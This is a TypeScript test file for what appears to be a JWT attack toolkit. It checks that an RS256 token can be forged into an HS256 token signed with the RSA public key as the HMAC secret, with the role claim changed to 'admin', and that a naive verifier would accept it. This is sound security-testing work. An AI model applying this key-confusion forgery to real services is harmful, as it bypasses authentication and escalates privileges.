import { test } from "node:test";
import assert from "node:assert/strict";
import { generateKeyPairSync, createSign, createHmac } from "node:crypto";
import { forgeJwtKeyConfusion, pemFromJwks, jwtForgeCandidates, parseJwt } from "./jwt.js";

const b64url = (s: string): string => Buffer.from(s).toString("base64url");

test("RS256->HS256 key confusion: the forged HS256 token verifies under the RSA public key used as the HMAC secret", () => {
  const { publicKey, privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const header = b64url(JSON.stringify({ alg: "RS256", typ: "JWT" }));
  const payload = b64url(JSON.stringify({ sub: "user", role: "user" }));
  const sig = createSign("RSA-SHA256").update(`${header}.${payload}`).sign(privateKey).toString("base64url");
  const token = `${header}.${payload}.${sig}`;

  const jwk = publicKey.export({ format: "jwk" });
  const pem = pemFromJwks(JSON.stringify({ keys: [{ ...jwk, use: "sig", kid: "1" }] }));
  assert.ok(pem && pem.includes("BEGIN PUBLIC KEY"), "derived a PEM from the JWKS");

  const forged = forgeJwtKeyConfusion(token, pem!, (c) => { c.role = "admin"; });
  assert.ok(forged);
  const [h, p, s] = forged!.split(".");
  // a naive verifier picking HS256 from the header would HMAC with the PEM (its "public key") — matches our signature
  const expected = createHmac("sha256", pem!).update(`${h}.${p}`).digest("base64url").replace(/=+$/, "");
  assert.equal(s, expected);
  assert.equal((parseJwt(forged!)!.header as { alg: string }).alg, "HS256");
  assert.equal((parseJwt(forged!)!.payload as { role: string }).role, "admin");

  assert.ok(jwtForgeCandidates(token, undefined, { publicKeyPem: pem! }).some((c) => c.technique === "key-confusion:RS256->HS256"));
});

test("pemFromJwks returns null without an RSA key / on bad input", () => {
  assert.equal(pemFromJwks('{"keys":[{"kty":"EC","crv":"P-256"}]}'), null);
  assert.equal(pemFromJwks("not json"), null);
});
